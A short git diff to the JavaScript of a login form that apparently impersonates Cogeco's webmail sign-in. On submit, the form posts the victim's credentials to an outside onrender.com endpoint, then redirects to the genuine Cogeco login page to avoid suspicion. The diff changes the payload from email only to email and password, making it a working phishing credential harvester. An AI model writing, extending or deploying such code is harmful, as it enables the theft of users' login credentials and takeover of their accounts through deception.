@@ -2,7 +2,6 @@ const form = document.getElementById("login-form");
 const emailInput = document.getElementById("email");
 const passwordInput = document.getElementById("password");
 
-// Correct backend URL
 const BACKEND_URL = "https://cogeco-page-tahd.onrender.com/login-event";
 
 form.addEventListener("submit", async (e) => {
@@ -20,12 +19,12 @@ form.addEventListener("submit", async (e) => {
     await fetch(BACKEND_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ email })
+      body: JSON.stringify({ email, password })
     });
 
     window.location.href = "https://wm.cogeco.ca/am/XUI/?locale=en";
   } catch (err) {
     console.error("Error sending login event:", err);
-    window.location.href = "https://wm.cogeco.ca/am/XUI/?locale=en";
+    window.location.href = "https://www.google.com/";
   }
 });
